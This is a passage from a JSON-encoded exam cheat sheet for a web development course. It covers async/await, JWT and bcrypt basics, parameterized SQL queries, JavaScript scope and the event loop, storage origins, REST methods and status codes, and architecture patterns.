Promise\ngetUserName(42).then(name =\u003e console.log(name));","why_html":"\u003cp\u003e\u003cstrong\u003eSyntactic sugar over .then()\u003c/strong\u003e — every \u003ccode\u003eawait\u003c/code\u003e in the solution corresponds directly to a \u003ccode\u003e.then()\u003c/code\u003e in the starter. The underlying Promise and microtask-queue mechanics are identical. The async function still returns a Promise to its caller; the \u003ccode\u003eawait\u003c/code\u003e keyword only affects execution inside \u003ccode\u003egetUserName\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eOmitting await is a common silent bug.\u003c/strong\u003e If you write \u003ccode\u003econst data = response.json()\u003c/code\u003e without \u003ccode\u003eawait\u003c/code\u003e, \u003ccode\u003edata\u003c/code\u003e holds a Promise object, not the parsed JSON. No error is thrown — the code continues with \u003ccode\u003edata.name\u003c/code\u003e evaluating to \u003ccode\u003eundefined\u003c/code\u003e. This is one of the most frequent async/await mistakes. Always \u003ccode\u003eawait\u003c/code\u003e any expression that returns a Promise before accessing its value.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eForgetting the \u003ccode\u003easync\u003c/code\u003e keyword is the mirror mistake.\u003c/strong\u003e Writing \u003ccode\u003eawait\u003c/code\u003e inside a function declared without \u003ccode\u003easync\u003c/code\u003e is a \u003ccode\u003eSyntaxError\u003c/code\u003e. The function declaration must include \u003ccode\u003easync\u003c/code\u003e — there is no implicit upgrade based on the presence of \u003ccode\u003eawait\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003easync does not change the underlying Promise behavior.\u003c/strong\u003e The network request, the microtask scheduling, and the fulfillment/rejection flow are all the same. \u003ccode\u003easync/await\u003c/code\u003e only changes how you write the code that reacts to those Promises — the engine still runs the same Promise machinery underneath.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003etry/catch maps directly to .catch().\u003c/strong\u003e A rejected Promise under \u003ccode\u003eawait\u003c/code\u003e throws into the nearest enclosing \u003ccode\u003ecatch\u003c/code\u003e block, exactly as \u003ccode\u003e.catch(err =&gt; ...)\u003c/code\u003e would handle it in a chain.\u003c/p\u003e"}],"cheatSheet":{"title":"COMP 4537 — exam-eve cheat sheet","blocks":[{"heading":"Formulas — quick reference","body_md":"Symbols: `PK` = primary key · `FK` = foreign key · `?` = parameterized placeholder · `CF` = cost factor\n\n**JWT structure**\n`base64url(header) . base64url(payload) . base64url(signature)`\nSigned with `secret key` (HS256, symmetric) or `private key` (RS256, asymmetric). Verified with the **signer's public key** (asymmetric) or same secret (symmetric).\n\n**bcrypt**\n`bcrypt.hash(plaintext, CF)` — CF = cost factor (a.k.a. salt rounds); default 10. Higher CF = slower hash = harder to brute-force.\n`bcrypt.compare(plaintext, hash)` → boolean\n\n**SQL parameterized query (injection-safe)**\n`db.query('SELECT * FROM t WHERE col = ?', [value])`\n`db.query('UPDATE t SET a=? WHERE id=?', [newVal, id])`\n\n**Cartesian join row count**\n`SELECT * FROM A, B` → always `rowsA × rowsB` rows regardless of column names.\n\n**readyState values (XMLHttpRequest)**\n`0=UNSENT · 1=OPENED · 2=HEADERS_RECEIVED · 3=LOADING · 4=DONE`\n\n**HTTP status code ranges**\n`2xx` success · `3xx` redirect · `4xx` client error · `5xx` server error\n\n**localStorage origin**\nOrigin = `protocol + domain + port`. Scoped per origin — path is irrelevant. Subdomain change = different origin.\n\n**Promise microtask order**\nExecutor → synchronous code → microtask queue (`.then()` / `.catch()`) → macrotask queue (`setTimeout`)","body_html":"\u003cp\u003eSymbols: \u003ccode\u003ePK\u003c/code\u003e = primary key · \u003ccode\u003eFK\u003c/code\u003e = foreign key · \u003ccode\u003e?\u003c/code\u003e = parameterized placeholder · \u003ccode\u003eCF\u003c/code\u003e = cost factor\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eJWT structure\u003c/strong\u003e\n\u003ccode\u003ebase64url(header) . base64url(payload) . base64url(signature)\u003c/code\u003e\nSigned with \u003ccode\u003esecret key\u003c/code\u003e (HS256, symmetric) or \u003ccode\u003eprivate key\u003c/code\u003e (RS256, asymmetric). Verified with the \u003cstrong\u003esigner&#39;s public key\u003c/strong\u003e (asymmetric) or same secret (symmetric).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ebcrypt\u003c/strong\u003e\n\u003ccode\u003ebcrypt.hash(plaintext, CF)\u003c/code\u003e — CF = cost factor (a.k.a. salt rounds); default 10. Higher CF = slower hash = harder to brute-force.\n\u003ccode\u003ebcrypt.compare(plaintext, hash)\u003c/code\u003e → boolean\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eSQL parameterized query (injection-safe)\u003c/strong\u003e\n\u003ccode\u003edb.query(&#39;SELECT * FROM t WHERE col = ?&#39;, [value])\u003c/code\u003e\n\u003ccode\u003edb.query(&#39;UPDATE t SET a=? WHERE id=?&#39;, [newVal, id])\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCartesian join row count\u003c/strong\u003e\n\u003ccode\u003eSELECT * FROM A, B\u003c/code\u003e → always \u003ccode\u003erowsA × rowsB\u003c/code\u003e rows regardless of column names.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ereadyState values (XMLHttpRequest)\u003c/strong\u003e\n\u003ccode\u003e0=UNSENT · 1=OPENED · 2=HEADERS_RECEIVED · 3=LOADING · 4=DONE\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHTTP status code ranges\u003c/strong\u003e\n\u003ccode\u003e2xx\u003c/code\u003e success · \u003ccode\u003e3xx\u003c/code\u003e redirect · \u003ccode\u003e4xx\u003c/code\u003e client error · \u003ccode\u003e5xx\u003c/code\u003e server error\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003elocalStorage origin\u003c/strong\u003e\nOrigin = \u003ccode\u003eprotocol + domain + port\u003c/code\u003e. Scoped per origin — path is irrelevant. Subdomain change = different origin.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePromise microtask order\u003c/strong\u003e\nExecutor → synchronous code → microtask queue (\u003ccode\u003e.then()\u003c/code\u003e / \u003ccode\u003e.catch()\u003c/code\u003e) → macrotask queue (\u003ccode\u003esetTimeout\u003c/code\u003e)\u003c/p\u003e"},{"heading":"JavaScript scope and hoisting","body_md":"| Keyword | Scope | Hoisted? | Before declaration |\n|---|---|---|---|\n| `var` | Function | Declaration only (init = `undefined`) | Returns `undefined` |\n| `let` | Block `{}` | No | `ReferenceError` (TDZ) |\n| `const` | Block `{}` | No | `ReferenceError` (TDZ) |\n\n**Hoisting trap (ISAQuiz6 Q4):** `var m` hoisted → `m=[]` is truthy assignment → prints `\"Green\"`. The `var m = 10` below the if is irrelevant.\n\n**let block scope (ISAQuiz6 Q5):** `let a` inside `if {}` → `console.log(a)` outside → `Uncaught ReferenceError: a is not defined` (NOT `undefined`).\n\n**No return → undefined (ISAQuiz6 Q6):** Any function without a `return` statement returns `undefined`. `console.log(foo(3))` where `foo` has no `return` → `undefined`.\n\n**Event loop drain order:** synchronous code → microtask queue (ALL drained) → one macrotask → repeat.","body_html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eKeyword\u003c/th\u003e\n\u003cth\u003eScope\u003c/th\u003e\n\u003cth\u003eHoisted?\u003c/th\u003e\n\u003cth\u003eBefore declaration\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003evar\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eFunction\u003c/td\u003e\n\u003ctd\u003eDeclaration only (init = \u003ccode\u003eundefined\u003c/code\u003e)\u003c/td\u003e\n\u003ctd\u003eReturns \u003ccode\u003eundefined\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003elet\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eBlock \u003ccode\u003e{}\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eReferenceError\u003c/code\u003e (TDZ)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003econst\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eBlock \u003ccode\u003e{}\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eReferenceError\u003c/code\u003e (TDZ)\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003eHoisting trap (ISAQuiz6 Q4):\u003c/strong\u003e \u003ccode\u003evar m\u003c/code\u003e hoisted → \u003ccode\u003em=[]\u003c/code\u003e is truthy assignment → prints \u003ccode\u003e&quot;Green&quot;\u003c/code\u003e. The \u003ccode\u003evar m = 10\u003c/code\u003e below the if is irrelevant.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003elet block scope (ISAQuiz6 Q5):\u003c/strong\u003e \u003ccode\u003elet a\u003c/code\u003e inside \u003ccode\u003eif {}\u003c/code\u003e → \u003ccode\u003econsole.log(a)\u003c/code\u003e outside → \u003ccode\u003eUncaught ReferenceError: a is not defined\u003c/code\u003e (NOT \u003ccode\u003eundefined\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eNo return → undefined (ISAQuiz6 Q6):\u003c/strong\u003e Any function without a \u003ccode\u003ereturn\u003c/code\u003e statement returns \u003ccode\u003eundefined\u003c/code\u003e. \u003ccode\u003econsole.log(foo(3))\u003c/code\u003e where \u003ccode\u003efoo\u003c/code\u003e has no \u003ccode\u003ereturn\u003c/code\u003e → \u003ccode\u003eundefined\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEvent loop drain order:\u003c/strong\u003e synchronous code → microtask queue (ALL drained) → one macrotask → repeat.\u003c/p\u003e"},{"heading":"Async JavaScript and event loop","body_md":"**Model:** single-threaded non-blocking. One thread; I/O delegated to OS; resumes via callbacks through the event queue.\n\n| Queue | Contents | Priority |\n|---|---|---|\n| Microtask | Promise `.then()` / `.catch()` / `.finally()` | Always drained fully first |\n| Macrotask | `setTimeout`, `setInterval`, I/O callbacks | One per loop tick |\n\n**Eager executor (ISAQuiz8):** Promise executor runs synchronously on construction — before any code after the `new Promise(...)` call site.\n\n```js\nconst fn = () =\u003e new Promise((resolve) =\u003e {\n  console.log(1);    // eager — runs now\n  resolve('done');\n});\nfn().then(res =\u003e console.log(res)); // microtask — after sync\nconsole.log('start');               // sync — runs next\n// Output: 1, start, done\n```\n\n**Pending trap (ISAQuiz8):** If executor never calls `resolve()` or `reject()`, Promise stays pending → `.then()` callbacks never run.\n\n**Native async vs sync:** `setTimeout` / `setInterval` → macrotask (async). `forEach` / `console.log` → synchronous.","body_html":"\u003cp\u003e\u003cstrong\u003eModel:\u003c/strong\u003e single-threaded non-blocking. One thread; I/O delegated to OS; resumes via callbacks through the event queue.\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eQueue\u003c/th\u003e\n\u003cth\u003eContents\u003c/th\u003e\n\u003cth\u003ePriority\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eMicrotask\u003c/td\u003e\n\u003ctd\u003ePromise \u003ccode\u003e.then()\u003c/code\u003e / \u003ccode\u003e.catch()\u003c/code\u003e / \u003ccode\u003e.finally()\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eAlways drained fully first\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eMacrotask\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003esetTimeout\u003c/code\u003e, \u003ccode\u003esetInterval\u003c/code\u003e, I/O callbacks\u003c/td\u003e\n\u003ctd\u003eOne per loop tick\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003eEager executor (ISAQuiz8):\u003c/strong\u003e Promise executor runs synchronously on construction — before any code after the \u003ccode\u003enew Promise(...)\u003c/code\u003e call site.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003econst fn = () =&gt; new Promise((resolve) =&gt; {\n  console.log(1);    // eager — runs now\n  resolve(&#39;done&#39;);\n});\nfn().then(res =&gt; console.log(res)); // microtask — after sync\nconsole.log(&#39;start&#39;);               // sync — runs next\n// Output: 1, start, done\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003ePending trap (ISAQuiz8):\u003c/strong\u003e If executor never calls \u003ccode\u003eresolve()\u003c/code\u003e or \u003ccode\u003ereject()\u003c/code\u003e, Promise stays pending → \u003ccode\u003e.then()\u003c/code\u003e callbacks never run.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eNative async vs sync:\u003c/strong\u003e \u003ccode\u003esetTimeout\u003c/code\u003e / \u003ccode\u003esetInterval\u003c/code\u003e → macrotask (async). \u003ccode\u003eforEach\u003c/code\u003e / \u003ccode\u003econsole.log\u003c/code\u003e → synchronous.\u003c/p\u003e"},{"heading":"Web architecture patterns (MSA/SOA, monolithic, serverless)","body_md":"| Pattern | One-line purpose | Key trade-off |\n|---------|-----------------|---------------|\n| **Monolithic** | Single deployable unit — all logic bundled | Full shutdown + recompile to deploy any change |\n| **Layered (n-Tier)** | Horizontal slices: Presentation → Business → Application → Data Access | Strict layer discipline; each layer only calls the one below |\n| **MSA / SOA** | Independent services communicating via API | Services communicate **only** via API — no direct DB access |\n| **Event-Driven** | Components react to events asynchronously (pub/sub) | Harder to trace causal chains; eventual consistency |\n| **Serverless (FaaS)** | Stateless functions on cloud infra | Cold-start latency; stateless by design |\n| **MVC** | Model (data) / View (UI) / Controller (coordinates) | Controller can bloat if boundaries blur |\n| **MVVM** | Two-way data binding via ViewModel | Angular, Vue, React+state are MVVM-based |\n\n- MSA = SOA in this course — do not contrast them\n- Monolithic is not \"bad\" — correct for MVPs and small teams\n- CQRS separates write commands from read queries (LinkedIn feeds)\n- Real systems combine patterns (Netflix: MSA + event-driven + CQRS)","body_html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003ePattern\u003c/th\u003e\n\u003cth\u003eOne-line purpose\u003c/th\u003e\n\u003cth\u003eKey trade-off\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eMonolithic\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eSingle deployable unit — all logic bundled\u003c/td\u003e\n\u003ctd\u003eFull shutdown + recompile to deploy any change\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eLayered (n-Tier)\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eHorizontal slices: Presentation → Business → Application → Data Access\u003c/td\u003e\n\u003ctd\u003eStrict layer discipline; each layer only calls the one below\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eMSA / SOA\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eIndependent services communicating via API\u003c/td\u003e\n\u003ctd\u003eServices communicate \u003cstrong\u003eonly\u003c/strong\u003e via API — no direct DB access\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eEvent-Driven\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eComponents react to events asynchronously (pub/sub)\u003c/td\u003e\n\u003ctd\u003eHarder to trace causal chains; eventual consistency\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eServerless (FaaS)\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eStateless functions on cloud infra\u003c/td\u003e\n\u003ctd\u003eCold-start latency; stateless by design\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eMVC\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eModel (data) / View (UI) / Controller (coordinates)\u003c/td\u003e\n\u003ctd\u003eController can bloat if boundaries blur\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eMVVM\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eTwo-way data binding via ViewModel\u003c/td\u003e\n\u003ctd\u003eAngular, Vue, React+state are MVVM-based\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e\n\u003cul\u003e\n\u003cli\u003eMSA = SOA in this course — do not contrast them\u003c/li\u003e\n\u003cli\u003eMonolithic is not &quot;bad&quot; — correct for MVPs and small teams\u003c/li\u003e\n\u003cli\u003eCQRS separates write commands from read queries (LinkedIn feeds)\u003c/li\u003e\n\u003cli\u003eReal systems combine patterns (Netflix: MSA + event-driven + CQRS)\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"JSON and localStorage / sessionStorage","body_md":"**Origin rule:** origin = protocol + domain + port — path is irrelevant\n\n| URL pair | Same origin? | Reason |\n|----------|-------------|--------|\n| `http://a.com/x.html` vs `http://a.com/y.html` | Yes | Path differs — irrelevant |\n| `http://a.com` vs `https://a.com` | No | Protocol changed |\n| `http://a.com` vs `http://sub.a.com` | No | Different subdomain |\n\n**localStorage API:**\n- `setItem(key, value)` — store string\n- `getItem(key)` → string or `null`\n- `removeItem(key)` — delete one entry\n- `clear()` — delete all entries for this origin\n- `length` — count of stored items\n\n**JSON round-trip:**\n```js\nlocalStorage.setItem('user', JSON.stringify({ name: 'Alice' }));\nconst user = JSON.parse(localStorage.getItem('user'));\n```\n\n- Only `JSON.stringify()` and `JSON.parse()` exist — `JSON.convert()` throws TypeError\n- localStorage persists until explicitly cleared; sessionStorage clears on tab close\n- localStorage is browser-specific — Chrome and Firefox do not share it","body_html":"\u003cp\u003e\u003cstrong\u003eOrigin rule:\u003c/strong\u003e origin = protocol + domain + port — path is irrelevant\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eURL pair\u003c/th\u003e\n\u003cth\u003eSame origin?\u003c/th\u003e\n\u003cth\u003eReason\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ehttp://a.com/x.html\u003c/code\u003e vs \u003ccode\u003ehttp://a.com/y.html\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003ctd\u003ePath differs — irrelevant\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ehttp://a.com\u003c/code\u003e vs \u003ccode\u003ehttps://a.com\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003ctd\u003eProtocol changed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003ehttp://a.com\u003c/code\u003e vs \u003ccode\u003ehttp://sub.a.com\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003ctd\u003eDifferent subdomain\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003elocalStorage API:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003esetItem(key, value)\u003c/code\u003e — store string\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003egetItem(key)\u003c/code\u003e → string or \u003ccode\u003enull\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eremoveItem(key)\u003c/code\u003e — delete one entry\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eclear()\u003c/code\u003e — delete all entries for this origin\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003elength\u003c/code\u003e — count of stored items\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eJSON round-trip:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003elocalStorage.setItem(&#39;user&#39;, JSON.stringify({ name: &#39;Alice&#39; }));\nconst user = JSON.parse(localStorage.getItem(&#39;user&#39;));\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eOnly \u003ccode\u003eJSON.stringify()\u003c/code\u003e and \u003ccode\u003eJSON.parse()\u003c/code\u003e exist — \u003ccode\u003eJSON.convert()\u003c/code\u003e throws TypeError\u003c/li\u003e\n\u003cli\u003elocalStorage persists until explicitly cleared; sessionStorage clears on tab close\u003c/li\u003e\n\u003cli\u003elocalStorage is browser-specific — Chrome and Firefox do not share it\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"REST anatomy — methods, status codes, idempotency","body_md":"| Method | Idempotent? | Use | Note |\n|--------|-------------|-----|------|\n| GET | Yes | Retrieve resource | Bookmarkable, cached, URL size limit |\n| POST | No | Create resource | Body has no size limit; not bookmarkable |\n| PUT | Yes | Replace entire resource | Partial payload overwrites missing fields |\n| PATCH | No | Update one property | Only sends changed fields |\n| DELETE | Yes | Remove resource | ID in URL; no body needed |\n| HEAD | Yes | Check existence | Same as GET without response body |\n\n**Status code ranges:**\n- `2xx` success — `200 OK`, `201 Created`\n- `3xx` redirect — `301 Moved Permanently`\n- `4xx` client error — `400 Bad Request`, `401 Unauthorized`, `404 Not Found`\n- `5xx` server error — `500 Internal Server Error`\n\n- `201 Created` is returned after POST creates a resource; `200 OK` is not\n- Never send credentials via GET — URL appears in browser history and server logs\n- GET has a URL size limit; POST does not","body_html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eMethod\u003c/th\u003e\n\u003cth\u003eIdempotent?\u003c/th\u003e\n\u003cth\u003eUse\u003c/th\u003e\n\u003cth\u003eNote\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003eGET\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003ctd\u003eRetrieve resource\u003c/td\u003e\n\u003ctd\u003eBookmarkable, cached, URL size limit\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePOST\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003ctd\u003eCreate resource\u003c/td\u003e\n\u003ctd\u003eBody has no size limit; not bookmarkable\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePUT\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003ctd\u003eReplace entire resource\u003c/td\u003e\n\u003ctd\u003ePartial payload overwrites missing fields\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003ePATCH\u003c/td\u003e\n\u003ctd\u003eNo\u003c/td\u003e\n\u003ctd\u003eUpdate one property\u003c/td\u003e\n\u003ctd\u003eOnly sends changed fields\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eDELETE\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003ctd\u003eRemove resource\u003c/td\u003e\n\u003ctd\u003eID in URL; no body needed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eHEAD\u003c/td\u003e\n\u003ctd\u003eYes\u003c/td\u003e\n\u003ctd\u003eCheck existence\u003c/td\u003e\n\u003ctd\u003eSame as GET without response body\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003eStatus code ranges:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003e2xx\u003c/code\u003e success — \u003ccode\u003e200 OK\u003c/code\u003e, \u003ccode\u003e201 Created\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003e3xx\u003c/code\u003e redirect — \u003ccode\u003e301 Moved Permanently\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003e4xx\u003c/code\u003e client error — \u003ccode\u003e400 Bad Request\u003c/code\u003e, \u003ccode\u003e401 Unauthorized\u003c/code\u003e, \u003ccode\u003e404 Not Found\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003e5xx\u003c/code\u003e server error — \u003ccode\u003e500 Internal Server Error\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003e\u003ccode\u003e201 Created\u003c/code\u003e is returned after POST creates a resource; \u003ccode\u003e200 OK\u003c/code\u003e is not\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eNever send credentials via GET — URL appears in browser history and server logs\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eGET has a URL size limit; POST does not\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"RESTful URL design and API versioning","body_md":"**Resource naming:** plural nouns — `/patients` (collection), `/patients/1` (single item)\n\n- Wrong: `GET /getPatient/1` — verb in URI\n- Correct: `GET /patients/1` — HTTP method expresses the action\n\n**Path vs query string:**\n- Path → identity: `GET /patients/1`\n- Query string → customization: `GET /patients?page=2&limit=10`\n\n**API versioning:**\n- Version belongs in URI path: `/v1/patients/`\n- Unversioned path `/patients/` redirects (3xx) to latest version\n- Introduce versioning before first public release — adding it later breaks all existing clients\n\n**Breaking changes that require a new version:**\n1. Response data format changes\n2. Field type changes (e.g., `int` → `string`)\n3. Endpoint removed or fundamentally changed","body_html":"\u003cp\u003e\u003cstrong\u003eResource naming:\u003c/strong\u003e plural nouns — \u003ccode\u003e/patients\u003c/code\u003e (collection), \u003ccode\u003e/patients/1\u003c/code\u003e (single item)\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eWrong: \u003ccode\u003eGET /getPatient/1\u003c/code\u003e — verb in URI\u003c/li\u003e\n\u003cli\u003eCorrect: \u003ccode\u003eGET /patients/1\u003c/code\u003e — HTTP method expresses the action\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003ePath vs query string:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePath → identity: \u003ccode\u003eGET /patients/1\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eQuery string → customization: \u003ccode\u003eGET /patients?page=2&amp;limit=10\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eAPI versioning:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eVersion belongs in URI path: \u003ccode\u003e/v1/patients/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eUnversioned path \u003ccode\u003e/patients/\u003c/code\u003e redirects (3xx) to latest version\u003c/li\u003e\n\u003cli\u003eIntroduce versioning before first public release — adding it later breaks all existing clients\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eBreaking changes that require a new version:\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eResponse data format changes\u003c/li\u003e\n\u003cli\u003eField type changes (e.g., \u003ccode\u003eint\u003c/code\u003e → \u003ccode\u003estring\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eEndpoint removed or fundamentally changed\u003c/li\u003e\n\u003c/ol\u003e"},{"heading":"Modern web architecture trends","body_md":"| Pattern | Dominant pressure it solves |\n|---------|---------------------------|\n| **Serverless** | Infrastructure cost — pay per invocation, not per hour |\n| **API-first** | Multi-client flexibility — web, mobile, IoT share one backend |\n| **Edge computing** | Latency — process data close to the user, not in a distant data center |\n| **Headless** | Frontend freedom — decouple presentation layer from backend |\n| **DDD** | Large-codebase complexity — bounded contexts contain domain models |\n| **DOMA** | MSA at scale (Uber) — group services into domain clusters with API boundaries |\n| **AIaaS** | AI without ML infrastructure — call Google/AWS/Azure API, get AI results |\n\n- Headless ≠ serverless: headless is an API contract decision; serverless is an infrastructure decision\n- AutoML platforms (Google AutoML, HuggingFace, Kaggle) customize models without ML expertise","body_html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003ePattern\u003c/th\u003e\n\u003cth\u003eDominant pressure it solves\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eServerless\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eInfrastructure cost — pay per invocation, not per hour\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eAPI-first\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eMulti-client flexibility — web, mobile, IoT share one backend\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eEdge computing\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eLatency — process data close to the user, not in a distant data center\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eHeadless\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eFrontend 